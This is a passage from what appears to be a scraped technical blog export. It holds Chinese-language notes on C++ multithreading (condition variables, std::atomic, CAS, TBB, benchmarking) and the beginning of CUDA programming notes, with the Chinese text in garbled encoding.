&lt;condition_variable&gt;template &lt;class T&gt;class MTQueue &#123; std::condition_variable m_cv; std::mutex m_mtx; std::vector&lt;T&gt; m_arr;public: T pop() &#123; std::unique_lock lck(m_mtx); m_cv.wait(lck, [this] &#123; return !m_arr.empty(); &#125;); T ret = std::move(m_arr.back()); m_arr.pop_back(); return ret; &#125; auto pop_hold() &#123; std::unique_lock lck(m_mtx); m_cv.wait(lck, [this] &#123; return !m_arr.empty(); &#125;); T ret = std::move(m_arr.back()); m_arr.pop_back(); return std::pair(std::move(ret), std::move(lck)); &#125; void push(T val) &#123; std::unique_lock lck(m_mtx); m_arr.push_back(std::move(val)); m_cv.notify_one(); &#125; void push_many(std::initializer_list&lt;T&gt; vals) &#123; std::unique_lock lck(m_mtx); std::copy( std::move_iterator(vals.begin()), std::move_iterator(vals.end()), std::back_insert_iterator(m_arr)); m_cv.notify_all(); &#125;&#125;;int main() &#123; MTQueue&lt;int&gt; foods; std::thread t1([&amp;] &#123; for (int i = 0; i &lt; 2; i++) &#123; auto food = foods.pop(); std::cout &lt;&lt; \"t1 got food:\" &lt;&lt; food &lt;&lt; std::endl; &#125; &#125;); std::thread t2([&amp;] &#123; for (int i = 0; i &lt; 2; i++) &#123; auto food = foods.pop(); std::cout &lt;&lt; \"t2 got food:\" &lt;&lt; food &lt;&lt; std::endl; &#125; &#125;); foods.push(42); foods.push(233); foods.push_many(&#123;666, 4399&#125;); t1.join(); t2.join(); return 0;&#125; åŸå­æ“ä½œ å¤šä¸ªçº¿ç¨‹åŒæ—¶å¾€ä¸€ä¸ª int å˜é‡é‡Œç´¯åŠ ï¼Œè¿™æ ·è‚¯å®šä¼šå‡ºé”™ï¼Œå› ä¸º counter += i åœ¨ CPU çœ‹æ¥ä¼šå˜æˆä¸‰ä¸ªæŒ‡ä»¤ï¼š è¯»å– counter å˜é‡åˆ° rax å¯„å­˜å™¨ rax å¯„å­˜å™¨çš„å€¼åŠ ä¸Š 1 æŠŠ rax å†™å…¥åˆ° counter å˜é‡ ç°ä»£ CPU ä¸ºäº†é«˜æ•ˆï¼Œä½¿ç”¨äº†å¤§é‡å¥‡æŠ€æ·«å·§ï¼Œæ¯”å¦‚ä»–ä¼šæŠŠä¸€æ¡æ±‡ç¼–æŒ‡ä»¤æ‹†åˆ†æˆå¾ˆå¤šå¾®æŒ‡ä»¤ (micro-ops)ï¼Œä¸‰ä¸ªç”šè‡³æœ‰ç‚¹ä¿å®ˆä¼°è®¡äº†ã€‚ ç°ä»£ CPU è¿˜æœ‰é«˜é€Ÿç¼“å­˜ï¼Œä¹±åºæ‰§è¡Œï¼ŒæŒ‡ä»¤çº§å¹¶è¡Œç­‰ä¼˜åŒ–ç­–ç•¥ï¼Œä½ æ ¹æœ¬ä¸çŸ¥é“æ¯æ¡æŒ‡ä»¤å®é™…çš„å…ˆåé¡ºåºã€‚ mutex å¤ªè¿‡é‡é‡çº§ï¼Œä»–ä¼šè®©çº¿ç¨‹è¢«æŒ‚èµ·ï¼Œä»è€Œéœ€è¦é€šè¿‡ç³»ç»Ÿè°ƒç”¨ï¼Œè¿›å…¥å†…æ ¸å±‚ï¼Œè°ƒåº¦åˆ°å…¶ä»–çº¿ç¨‹æ‰§è¡Œï¼Œæœ‰å¾ˆå¤§çš„å¼€é”€ã€‚åªæ˜¯æƒ³è¦ä¿®æ”¹ä¸€ä¸ªå°å°çš„ int å˜é‡è€Œå·²ï¼Œç”¨æ˜‚è´µçš„ mutex ä¸¥é‡å½±å“äº†æ•ˆç‡ã€‚ atomic æ›´è½»é‡çº§çš„ atomicï¼Œå¯¹ä»–çš„ += ç­‰æ“ä½œï¼Œä¼šè¢«ç¼–è¯‘å™¨è½¬æ¢æˆä¸“é—¨çš„æŒ‡ä»¤ã€‚ CPU è¯†åˆ«åˆ°è¯¥æŒ‡ä»¤æ—¶ï¼Œä¼šé”ä½å†…å­˜æ€»çº¿ï¼Œæ”¾å¼ƒä¹±åºæ‰§è¡Œç­‰ä¼˜åŒ–ç­–ç•¥ï¼ˆå°†è¯¥æŒ‡ä»¤è§†ä¸ºä¸€ä¸ªåŒæ­¥ç‚¹ï¼Œå¼ºåˆ¶åŒæ­¥æ‰ä¹‹å‰æ‰€æœ‰çš„å†…å­˜æ“ä½œï¼‰ï¼Œä»è€Œå‘ä½ ä¿è¯è¯¥æ“ä½œæ˜¯åŸå­ (atomic) çš„ï¼Œä¸å¯åˆ†å‰²çš„ã€‚ åªéœ€æŠŠ int æ”¹æˆ atomic å³å¯ã€‚å†™æ³•ä¹Ÿæœ‰è®²ç©¶ï¼š 123counter = counter + 1; // é”™ï¼Œä¸èƒ½ä¿è¯åŸå­æ€§counter += 1; // OKï¼Œèƒ½ä¿è¯åŸå­æ€§counter++; // OKï¼Œèƒ½ä¿è¯åŸå­æ€§ é™¤äº†ç”¨æ–¹ä¾¿çš„è¿ç®—ç¬¦é‡è½½ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ç›´æ¥è°ƒç”¨ç›¸åº”çš„å‡½æ•°åï¼Œæ¯”å¦‚ï¼š fetch_add å¯¹åº”äº +=ï¼›store å¯¹åº”äº =ï¼›load ç”¨äºè¯»å–å…¶ä¸­çš„ int å€¼ã€‚ fetch_addä¼šè¿”å›å…¶æ—§å€¼ï¼š 1int old = atm.fetch_add(val) é™¤äº†ä¼šå¯¼è‡´ atm çš„å€¼å¢åŠ  val å¤–ï¼Œè¿˜ä¼šè¿”å› atm å¢åŠ å‰çš„å€¼ï¼Œå­˜å‚¨åˆ° oldã€‚ å½“ç„¶è¿™é‡Œä¹Ÿå¯ä»¥ counter++ï¼Œä¸è¿‡è¦è¿½åŠ å¤šä¸ªçš„è¯è¿˜æ˜¯å¾—ç”¨åˆ° counter.fetch_add(n)ã€‚ 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;atomic&gt;#include &lt;vector&gt;int main() &#123; std::atomic&lt;int&gt; counter; counter.store(0); std::vector&lt;int&gt; data(20000); std::thread t1([&amp;] &#123; for (int i = 0; i &lt; 10000; i++) &#123; int index = counter.fetch_add(1); data[index] = i; &#125; &#125;); std::thread t2([&amp;] &#123; for (int i = 0; i &lt; 10000; i++) &#123; int index = counter.fetch_add(1); data[index] = i + 10000; &#125; &#125;); t1.join(); t2.join(); std::cout &lt;&lt; data[10000] &lt;&lt; std::endl; return 0;&#125; exchange(val) ä¼šæŠŠ val å†™å…¥åŸå­å˜é‡ï¼ŒåŒæ—¶è¿”å›å…¶æ—§çš„å€¼ã€‚ 12345678910111213141516#include &lt;iostream&gt;#include &lt;atomic&gt;int main() &#123; std::atomic&lt;int&gt; counter; counter.store(0); int old = counter.exchange(3); std::cout &lt;&lt; \"old=\" &lt;&lt; old &lt;&lt; std::endl; // 0 int now = counter.load(); std::cout &lt;&lt; \"cnt=\" &lt;&lt; now &lt;&lt; std::endl; // 3 return 0;&#125; compare_exchange_strong(old, val) ï¼Œä¼šè¯»å–åŸå­å˜é‡çš„å€¼ï¼Œæ¯”è¾ƒä»–æ˜¯å¦å’Œ old ç›¸ç­‰ã€‚å¦‚æœä¸ç›¸ç­‰ï¼Œåˆ™æŠŠåŸå­å˜é‡çš„å€¼å†™å…¥ oldã€‚å¦‚æœç›¸ç­‰ï¼Œåˆ™æŠŠ val å†™å…¥åŸå­å˜é‡ã€‚è¿”å›ä¸€ä¸ª bool å€¼ï¼Œè¡¨ç¤ºæ˜¯å¦ç›¸ç­‰ã€‚æ³¨æ„ old è¿™é‡Œä¼ çš„å…¶å®æ˜¯ä¸€ä¸ªå¼•ç”¨ã€‚ 123456789101112131415161718192021222324252627#include &lt;iostream&gt;#include &lt;atomic&gt;int main() &#123; boolalpha(std::cout); std::atomic&lt;int&gt; counter; counter.store(2); int old = 1; bool equal = counter.compare_exchange_strong(old, 3); std::cout &lt;&lt; \"equal=\" &lt;&lt; equal &lt;&lt; std::endl; // false std::cout &lt;&lt; \"old=\" &lt;&lt; old &lt;&lt; std::endl; // 2 int now = counter.load(); std::cout &lt;&lt; \"cnt=\" &lt;&lt; now &lt;&lt; std::endl; // 2 equal = counter.compare_exchange_strong(old, 3); std::cout &lt;&lt; \"equal=\" &lt;&lt; equal &lt;&lt; std::endl; // true std::cout &lt;&lt; \"old=\" &lt;&lt; old &lt;&lt; std::endl; // 2 now = counter.load(); std::cout &lt;&lt; \"cnt=\" &lt;&lt; now &lt;&lt; std::endl; // 3 return 0;&#125; compare_exchange_strong çš„é€»è¾‘ï¼Œä¸€èˆ¬ç®€ç§° CAS (compare-and-swap)ï¼Œä»–æ˜¯å¹¶è¡Œç¼–ç¨‹æœ€å¸¸ç”¨çš„åŸå­æ“ä½œä¹‹ä¸€ã€‚å®é™…ä¸Šä»»ä½• atomic æ“ä½œï¼ŒåŒ…æ‹¬ fetch_addï¼Œéƒ½å¯ä»¥åŸºäº CAS æ¥å®ç°ï¼šè¿™å°±æ˜¯ Taichi å®ç°æµ®ç‚¹æ•° atomic_add çš„æ–¹æ³•ã€‚ å¹¶å‘ä¸å¹¶è¡Œ å¹¶å‘ï¼ˆæ—¶é—´ç‰‡è°ƒåº¦ï¼‰ï¼šå•æ ¸å¤„ç†å™¨ï¼Œæ“ä½œç³»ç»Ÿé€šè¿‡æ—¶é—´ç‰‡è°ƒåº¦ç®—æ³•ï¼Œè½®æ¢ç€æ‰§è¡Œç€ä¸åŒçš„çº¿ç¨‹ï¼Œçœ‹èµ·æ¥å°±å¥½åƒæ˜¯åŒæ—¶è¿è¡Œä¸€æ ·ï¼Œå…¶å®æ¯ä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹åœ¨è¿è¡Œã€‚ç›®çš„ï¼šå¼‚æ­¥åœ°å¤„ç†å¤šä¸ªä¸åŒçš„ä»»åŠ¡ï¼Œé¿å…åŒæ­¥é€ æˆçš„é˜»å¡ã€‚ å¹¶è¡Œï¼ˆç‰©ç†æ ¸å¿ƒå¹¶è¡Œï¼‰ï¼šå¤šæ ¸å¤„ç†å™¨ï¼Œæ¯ä¸ªå¤„ç†å™¨æ‰§è¡Œä¸€ä¸ªçº¿ç¨‹ï¼ŒçœŸæ­£çš„åŒæ—¶è¿è¡Œã€‚ç›®çš„ï¼šå°†ä¸€ä¸ªä»»åŠ¡åˆ†æ´¾åˆ°å¤šä¸ªæ ¸ä¸Šï¼Œä»è€Œæ›´å¿«å®Œæˆä»»åŠ¡ã€‚ å¼€æºå·¥å…·ï¼šå› ç‰¹å°”å¼€æºçš„å¹¶è¡Œç¼–ç¨‹åº“TBBï¼ˆæ³¨æ„ä½¿ç”¨ 2021.5 ä¹‹å‰çš„ç‰ˆæœ¬ï¼Œè€Œä¸æ˜¯æœ€è¿‘æ”¹åæˆ OneTBB çš„ç‰ˆæœ¬ï¼‰ 1sudo apt-get install libtbb-dev TBBç®€ä»‹ ä½¿ç”¨ä»»åŠ¡ç»„ï¼Œç»„ç»‡ä»»åŠ¡ã€‚ä¸€ä¸ªä»»åŠ¡ä¸ä¸€å®šå¯¹åº”ä¸€ä¸ªçº¿ç¨‹ï¼Œå¦‚æœä»»åŠ¡æ•°é‡è¶…è¿‡CPUæœ€å¤§çš„çº¿ç¨‹æ•°ï¼Œä¼šç”± TBB åœ¨ç”¨æˆ·å±‚è´Ÿè´£è°ƒåº¦ä»»åŠ¡è¿è¡Œåœ¨å¤šä¸ªé¢„å…ˆåˆ†é…å¥½çš„çº¿ç¨‹ï¼Œè€Œä¸æ˜¯ç”±æ“ä½œç³»ç»Ÿè´Ÿè´£è°ƒåº¦çº¿ç¨‹è¿è¡Œåœ¨å¤šä¸ªç‰©ç†æ ¸å¿ƒã€‚ TBBä»»åŠ¡é˜Ÿåˆ—è°ƒåº¦ä½¿ç”¨ å·¥ä½œçªƒå–æ³•ï¼ˆwork-stealingï¼‰ï¼Œæ¯ä¸ªçº¿ç¨‹ä¸€ä¸ªä»»åŠ¡é˜Ÿåˆ—ï¼Œåšå®Œæœ¬èŒå·¥ä½œåå¯ä»¥è®¤é¢†å…¶ä»–çº¿ç¨‹çš„ä»»åŠ¡ã€‚è€Œä¸æ˜¯åŸå§‹çš„å•ä¸€ä»»åŠ¡é˜Ÿåˆ—ã€‚ æä¾›äº†å¹¶å‘ç‰ˆæœ¬çš„STLå®¹å™¨ï¼Œ tbb::concurrent_vectorã€tbb::concurrent_map ç­‰ã€‚ ä¼˜åŒ–äº†æµæ°´çº¿å·¥ä½œæµç¨‹ï¼Œæ›´å¥½åœ°åˆ©ç”¨ç¼“å­˜å’Œç¨‹åºçš„å±€éƒ¨æ€§ã€‚ æ€§èƒ½æµ‹è¯•å·¥å…· gitä¸Šä¸‹è½½ä»£ç åº“ï¼Œè¿›è¡Œç®€å•æµ‹è¯•ã€‚ 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;cmath&gt;#include &lt;benchmark/benchmark.h&gt;constexpr size_t n = 1&lt;&lt;27;std::vector&lt;float&gt; a(n);void BM_for(benchmark::State &amp;bm) &#123; for (auto _: bm) &#123; // fill a with sin(i) for (size_t i = 0; i &lt; a.size(); i++) &#123; a[i] = std::sin(i); &#125; &#125;&#125;BENCHMARK(BM_for);void BM_reduce(benchmark::State &amp;bm) &#123; for (auto _: bm) &#123; // calculate sum of a float res = 0; for (size_t i = 0; i &lt; a.size(); i++) &#123; res += a[i]; &#125; // å› ä¸º res å¹¶æ²¡æœ‰è¢«ä½¿ç”¨ï¼Œé˜²æ­¢ç¼–è¯‘ä¼˜åŒ–æ‰è¿™æ®µforå¾ªç¯ benchmark::DoNotOptimize(res); &#125;&#125;BENCHMARK(BM_reduce);BENCHMARK_MAIN(); 12345678910111213141516171819cmake_minimum_required(VERSION 3.10)set(CMAKE_CXX_STANDARD 17)set(CMAKE_BUILD_TYPE Release)project(main LANGUAGES CXX)add_executable(main main.cpp)#find_package(OpenMP REQUIRED)#target_link_libraries(main PUBLIC OpenMP::OpenMP_CXX)find_package(TBB REQUIRED)target_link_libraries(main PUBLIC TBB::tbb)# æ³¨æ„ OFF è¿™ä¸ªè®¾ç½®ï¼Œå…³é—­åä¸ä¼šæœç´¢æ˜¯å¦åœ¨ç³»ç»Ÿç¯å¢ƒå®‰è£…äº†google test å·¥å…·åŒ…set(BENCHMARK_ENABLE_TESTING OFF CACHE BOOL \"Turn off the fking test!\")add_subdirectory(benchmark)target_link_libraries(main PUBLIC benchmark)","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"C++","slug":"Notes/C","permalink":"https://racleray.github.io/categories/Notes/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://racleray.github.io/tags/C/"},{"name":"Multi-threading","slug":"Multi-threading","permalink":"https://racleray.github.io/tags/Multi-threading/"}],"author":"HeRui"},{"title":"CUDA ç¬”è®°","slug":"CUDA-ç¬”è®°","date":"2023-08-15T15:14:28.000Z","updated":"2024-01-09T10:18:30.974Z","comments":true,"path":"posts/244a647.html","link":"","permalink":"https://racleray.github.io/posts/244a647.html","excerpt":"CUDAç¬”è®°","text":"NVCCæ–‡æ¡£ å¼‚æ„è®¡ç®— CPUå’ŒGPUæ˜¯ä¸¤ä¸ªç‹¬ç«‹çš„å¤„ç†å™¨ï¼Œå®ƒä»¬é€šè¿‡å•ä¸ªè®¡ç®—èŠ‚ç‚¹ä¸­çš„PCI-Expressæ€»çº¿ç›¸è¿ã€‚ GPUä¸æ˜¯ä¸€ä¸ªç‹¬ç«‹è¿è¡Œçš„å¹³å°è€Œæ˜¯CPUçš„åå¤„ç†å™¨ã€‚å› æ­¤ï¼ŒGPUå¿…é¡»é€šè¿‡PCIeæ€»çº¿ä¸åŸºäºCPUçš„ä¸»æœºç›¸è¿è¿›è¡Œæ“ä½œã€‚ GPUï¼šè®¡ç®—å•å…ƒå¤šï¼Œæ§åˆ¶å•å…ƒå°‘ï¼Œæ— å¤§é‡Cacheã€‚ CPUï¼šè®¡ç®—å•å…ƒå°‘ï¼Œæ§åˆ¶å•å…ƒå¤šï¼Œ Cacheå æ®äº†å¤§é‡ç©ºé—´ã€‚ ä¸€ä¸ªå¼‚æ„åº”ç”¨åŒ…æ‹¬ä¸¤éƒ¨åˆ†ï¼šä¸»æœºä»£ç å’Œè®¾å¤‡ä»£ç ã€‚ä¸»æœºä»£ç åœ¨CPUä¸Šè¿è¡Œï¼Œè®¾å¤‡ä»£ç åœ¨GPUä¸Šè¿è¡Œã€‚ ç¨‹åºé€šå¸¸ç”±CPUåˆå§‹åŒ–ã€‚åœ¨è®¾å¤‡ç«¯åŠ è½½è®¡ç®—å¯†é›†å‹ä»»åŠ¡ä¹‹å‰ï¼ŒCPUä»£ç è´Ÿè´£ç®¡ç†è®¾å¤‡ç«¯çš„ç¯å¢ƒã€ä»£ç å’Œæ•°æ®ã€‚ CPUé€‚åˆå¤„ç†æ•°æ®è§„æ¨¡è¾ƒå°ã€æ§åˆ¶å¯†é›†å‹ä»»åŠ¡ï¼ŒGPUé€‚åˆå¤„ç†æ•°æ®è§„æ¨¡è¾ƒå¤§ã€åŒ…å«æ•°æ®å¹¶è¡Œçš„è®¡ç®—å¯†é›†å‹ä»»åŠ¡ã€‚ CUDAç¡¬ä»¶ç¯å¢ƒ GPUæ¶æ„ï¼šTeslaã€Fermiã€Keplerã€Maxwellã€Pascalã€Voltaã€Turingã€Ampere æ˜¾å¡ç³»åˆ—ï¼šGeForceã€Quadroã€Teslaã€Jetsonã€‚ GeForceï¼šä¸»è¦ç”¨äºæ¸¸æˆå’Œå¨±ä¹ï¼Œä¹Ÿç”¨äºç§‘å­¦è®¡ç®—ã€‚ Quadroï¼šä¸“ä¸šå›¾å½¢è®¾è®¡ã€‚ Teslaï¼šæœåŠ¡å™¨ä¸“ç”¨å¡ï¼Œç”¨äºå¤§è§„æ¨¡å¹¶è¡Œè®¡ç®—ï¼Œé€‚ç”¨äºæœºå™¨å­¦ä¹ ã€‚ Jetsonï¼šé€‚ç”¨äºAIåº”ç”¨ã€‚ NVIDIAä½¿ç”¨â€œè®¡ç®—èƒ½åŠ›â€æ¥å¯¹åº”ç¡¬ä»¶ç‰ˆæœ¬ã€‚ NVIDIA Amperep Architecture ï¼ˆcompute capabilities 8.x)ï¼š Tesla A Series NVIDIA Turing Architecture ï¼ˆcompute capabilities 7.x)ï¼š GeForce 2000 Series Quadro RTX Series Tesla T Series NVIDIA Volta Architecture (compute capabilities 7.x): DRIVE/JETSON AGX/Xavier Quadro GV Series Tesla v Series NVIDIA Pascal Architecture (compute capabilities 6.x): Tegra X2 GeForce 1000 Series Quadro P Series Tesla P Series é‡è¦æ¦‚å¿µ thread: ä¸€ä¸ªCUDAçš„å¹¶è¡Œç¨‹åºä¼šè¢«ä»¥è®¸å¤šä¸ªthreadæ¥æ‰§è¡Œã€‚ block: æ•°ä¸ªthreadç»„æˆä¸€ä¸ªblockï¼ŒåŒä¸€ä¸ªblockä¸­çš„threadå¯ä»¥åŒæ­¥ï¼Œä¹Ÿå¯ä»¥é€šè¿‡shared memoryè¿›è¡Œé€šä¿¡ã€‚ grid: å¤šä¸ªblockåˆ™ä¼šå†æ„æˆgridã€‚ å®é™…åœ¨ç¡¬ä»¶ä¸Šå°±æ˜¯æŒ‰ç…§ SM(Streaming MultiProcessor) ç»„ç»‡è®¡ç®—å•å…ƒçš„ã€‚ä¸€ä¸ªSMç”±å¤šä¸ªæµå¼å•å¤„ç†å™¨ï¼ˆSPï¼‰ç»„æˆã€‚æ¯ä¸ª SP å¯ä»¥å¤„ç†ä¸€ä¸ªæˆ–å¤šä¸ªçº¿ç¨‹ã€‚ SMé‡‡ç”¨çš„SIMT(Single-Instruction, Multiple-Threadï¼Œå•æŒ‡ä»¤å¤šçº¿ç¨‹)æ¶æ„ï¼Œwarp(çº¿ç¨‹æŸ)æ˜¯æœ€åŸºæœ¬çš„æ‰§è¡Œå•å…ƒï¼Œä¸€ä¸ªwarpåŒ…å«32ä¸ªå¹¶è¡Œthreadã€‚warp(çº¿ç¨‹æŸ)ç”±warp schedulerè´Ÿè´£è°ƒåº¦ã€‚ å½“ä¸€ä¸ªkernelè¢«æ‰§è¡Œæ—¶ï¼Œgirdä¸­çš„blockè¢«åˆ†é…åˆ°SMä¸Šï¼Œä¸€ä¸ªblockçš„threadåªèƒ½åœ¨ä¸€ä¸ªSMä¸Šè°ƒåº¦ã€‚ é€šå¸¸æ¿å—æ•°é‡æ€»æ˜¯å¤§äº SM çš„æ•°é‡ï¼Œè¿™æ—¶è‹±ä¼Ÿè¾¾é©±åŠ¨å°±ä¼šåœ¨å¤šä¸ª SM ä¹‹é—´è°ƒåº¦ä½ æäº¤çš„å„ä¸ªæ¿å—ã€‚æ­£å¦‚æ“ä½œç³»ç»Ÿåœ¨å¤šä¸ª CPU æ ¸å¿ƒä¹‹é—´è°ƒåº¦çº¿ç¨‹é‚£æ ·ã€‚ GPU ä¸ä¼šåƒ CPU é‚£æ ·åšæ—¶é—´ç‰‡è½®æ¢â€”â€”æ¿å—ä¸€æ—¦è¢«è°ƒåº¦åˆ°äº†ä¸€ä¸ª SM ä¸Šï¼Œå°±ä¼šä¸€ç›´æ‰§è¡Œï¼Œç›´åˆ°ä»–æ‰§è¡Œå®Œé€€å‡ºï¼Œè¿™æ ·çš„å¥½å¤„æ˜¯ä¸å­˜åœ¨ä¿å­˜å’Œåˆ‡æ¢ä¸Šä¸‹æ–‡ï¼ˆå¯„å­˜å™¨ï¼Œå…±äº«å†…å­˜ç­‰ï¼‰çš„å¼€é”€ï¼Œæ¯•ç«Ÿ GPU çš„æ•°æ®é‡æ¯”è¾ƒå¤§ï¼Œç¦ä¸èµ·è¿™æ ·åˆ‡æ¢æ¥åˆ‡æ¢å»ã€‚ ä¸€ä¸ªgridå¯ä»¥åŒ…å«å¤šä¸ªblockï¼Œblockçš„ç»„ç»‡æ–¹å¼å¯ä»¥æ˜¯ä¸€ç»´çš„ï¼ŒäºŒç»´æˆ–è€…ä¸‰ç»´çš„ã€‚ CUDAä¸­æ¯ä¸€ä¸ªçº¿ç¨‹éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„æ ‡è¯†IDå³threadIdxï¼Œè¿™ä¸ªIDéšç€gridå’Œblockçš„åˆ’åˆ†æ–¹å¼çš„ä¸åŒè€Œå˜åŒ–ã€‚ æ ¹æ®æ¶æ„çš„ä¸åŒï¼Œè®¡ç®—threadIdxéœ€è¦è€ƒè™‘ä¸åŒçš„ç»´åº¦ã€‚ ç‰ˆæœ¬52ï¼šQuadro M6000 , GeForce 900, GTX-970, GTX-980, GTX Titan X ç‰ˆæœ¬53ï¼šTegra (Jetson) TX1 / Tegra X1, Drive CX, Drive PX, Jetson Nano ç‰ˆæœ¬60ï¼šQuadro GP100, Tesla P100, DGX-1 (Generic Pascal) ç‰ˆæœ¬61ï¼šGTX 1080, GTX 1070, GTX 1060, GTX 1050, GTX 1030 (GP108), GT 1010 (GP108) Titan Xp, Tesla P40, Tesla P4, Discrete GPU on the NVIDIA Drive PX2 ç‰ˆæœ¬62ï¼šIntegrated GPU on the NVIDIA Drive PX2, Tegra (Jetson) TX2 ç‰ˆæœ¬70ï¼šDGX-1 with Volta, Tesla V100, GTX 1180 (GV104), Titan V, Quadro GV100 ç‰ˆæœ¬72ï¼šJetson AGX Xavier, Drive AGX Pegasus, Xavier NX ç‰ˆæœ¬75ï¼šGTX/RTX Turing â€“ GTX 1660 Ti, RTX 2060, RTX 2070, RTX 2080, Titan RTX, Quadro RTX 4000, Quadro RTX 5000, Quadro RTX 6000, Quadro RTX 8000, Quadro T1000/T2000, Tesla T4 ç‰ˆæœ¬80ï¼šNVIDIA A100 (the name â€œTeslaâ€ has been dropped â€“ GA100), NVIDIA DGX-A100 ç‰ˆæœ¬86ï¼šTesla GA10x cards, RTX Ampere â€“ RTX 3080, GA102 â€“ RTX 3090, RTX A2000, A3000, A4000, A5000, A6000, NVIDIA A40, GA106 â€“ RTX 3060, GA104 â€“ RTX 3070, GA107 â€“ RTX 3050, Quadro A10, Quadro A16, Quadro A40, A2 Tensor Core GPU ä½¿ç”¨NVCCç¼–è¯‘ï¼Œéœ€è¦æ³¨æ„ç‰ˆæœ¬å·ï¼š 1nvcc -arch=sm_60 -o test1 .\\test1.cu -run ä½¿ç”¨CMakeï¼Œå¯ä»¥æŒ‡å®šå¤šä¸ªå¯é€‰ç‰ˆæœ¬å·ï¼Œä½†æ˜¯ä¼šå¢åŠ ç¼–è¯‘æ—¶é—´ï¼š 123456789cmake_minimum_required(VERSION 3.10)set(CMAKE_CXX_STANDARD 17)set(CMAKE_BUILD_TYPE Release)set(CMAKE_CUDA_ARCHITECTURES 60;70;75;86)project(hellocuda LANGUAGES CXX CUDA)add_executable(test test.cu) CUDAè½¯ä»¶ä½“ç³» CUDA cuFFT ï¼šåˆ©ç”¨CUDAè¿›è¡Œå¿«é€Ÿå‚…é‡Œå¶å˜æ¢çš„å‡½æ•°åº“ ã€‚ cuBLASï¼šçº¿æ€§ä»£æ•°æ–¹é¢çš„CUDAåº“ã€‚ cuDNN ï¼šåˆ©ç”¨CUDAè¿›è¡Œæ·±åº¦å·ç§¯ç¥ç»ç½‘ç»œï¼Œæ·±åº¦å­¦ä¹ å¸¸ç”¨ã€‚ thrustï¼šå®ç°äº†ä¼—å¤šåŸºæœ¬å¹¶è¡Œç®—æ³•çš„C++æ¨¡æ¿åº“ã€‚ cuSolverï¼šçº¿æ€§ä»£æ•°æ–¹é¢çš„CUDAåº“ã€‚ cuRANDï¼šéšæœºæ•°ç”Ÿæˆæœ‰å…³çš„åº“ã€‚ CUDA API CUDA è¿è¡Œæ—¶ APIå’ŒCUDA é©±åŠ¨APIæä¾›äº†å®ç°è®¾å¤‡ç®¡ç†ã€ä¸Šä¸‹æ–‡ç®¡ç†ã€å­˜å‚¨å™¨ç®¡ç†ã€ä»£ç å—ç®¡ç†ã€æ‰§è¡Œæ§åˆ¶ã€ çº¹ç†ç´¢å¼•ç®¡ç†ä¸OpenGLå’ŒDirect3Dçš„äº’æ“ä½œæ€§çš„åº”ç”¨æ¥å£ã€‚ é©±åŠ¨APIæ˜¯ä¸€ç§åŸºäºå¥æŸ„çš„åº•å±‚æ¥å£ï¼Œå¤§å¤šæ•°å¯¹è±¡é€šè¿‡å¥æŸ„è¢«å¼•ç”¨ï¼Œå…¶å‡½æ•°å‰ç¼€å‡ä¸ºcuã€‚ è¿è¡Œæ—¶APIå¯¹é©±åŠ¨APIè¿›è¡Œäº†ä¸€å®šçš„å°è£…ï¼Œéšè—äº†å…¶éƒ¨åˆ†å®ç°ç»†èŠ‚ï¼Œå› æ­¤ä½¿ç”¨èµ·æ¥æ›´ä¸ºæ–¹ä¾¿ï¼Œç®€åŒ–äº†ç¼–ç¨‹çš„è¿‡ç¨‹ã€‚ CUDA CUDAæ˜¯ä¸€ç§é€šç”¨çš„å¹¶è¡Œè®¡ç®—å¹³å°å’Œç¼–ç¨‹æ¨¡å‹ï¼Œæ˜¯åœ¨Cè¯­è¨€åŸºç¡€ä¸Šæ‰©å±•çš„ã€‚å€ŸåŠ©äºCUDAï¼Œå¯ä»¥åƒç¼–å†™Cè¯­è¨€ç¨‹åºä¸€æ ·å®ç°å¹¶è¡Œç®—æ³•ã€‚ CUDAç¼–ç¨‹æ¨¡å‹æ˜¯ä¸€ä¸ªå¼‚æ„æ¨¡å‹ï¼Œéœ€è¦CPUå’ŒGPUååŒå·¥ä½œï¼Œå› æ­¤å¼•å…¥äº†ä¸»æœº(Host)ç«¯ä¸è®¾å¤‡ (Device)ç«¯çš„æ¦‚å¿µã€‚ ä¸€ä¸ªå®Œæ•´çš„CUDAç¨‹åºç”±ä¸»æœºä»£ç ï¼ˆä¸²è¡Œä»£ç ï¼‰å’Œè®¾å¤‡ä»£ç ï¼ˆå¹¶è¡Œä»£ç ï¼‰ç»„æˆã€‚ CUDAç¨‹åºå®ç°æµç¨‹ CUDAå†…å­˜ç®¡ç† CUDAè¿è¡Œæ—¶è´Ÿè´£åˆ†é…ä¸é‡Šæ”¾è®¾å¤‡å†…å­˜ï¼Œå¹¶ä¸”åœ¨ä¸»æœºå†…å­˜å’Œè®¾å¤‡å†…å­˜ä¹‹é—´ä¼ è¾“æ•°æ®ã€‚ CUDAç¼–ç¨‹åŸºç¡€ CUDAç¨‹åºä¸»è¦ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œä¸€éƒ¨åˆ†æ˜¯ä¸»å‡½æ•°ï¼Œå¦ä¸€éƒ¨åˆ†æ˜¯è®¾å¤‡å‡½æ•°ã€‚ __global__ å®šä¹‰ä¸€ä¸ªkernelå‡½æ•°å…¥å£å‡½æ•°ï¼Œä¸€èˆ¬åœ¨CPUä¸Šè°ƒç”¨ï¼ŒGPUä¸Šæ‰§è¡Œã€‚å‡½æ•°ç±»å‹å¿…é¡»ä¸ºvoidç±»å‹ã€‚ __device__ å®šä¹‰åœ¨deviceï¼ˆGPUï¼‰æ‰§è¡Œçš„å‡½æ•°ã€‚ __host__ å®šä¹‰åœ¨hostï¼ˆCPUï¼‰æ‰§è¡Œçš„å‡½æ•°ã€‚ ä½¿ç”¨nvccå¯¹ .cu æºä»£ç æ–‡ä»¶è¿›è¡Œç¼–è¯‘ã€‚ äº† CUDA çš„æ ¸å‡½æ•°è°ƒç”¨æ—¶éœ€è¦ç”¨ kernel&lt;&lt;&lt;1, 1&gt;&gt;&gt;() 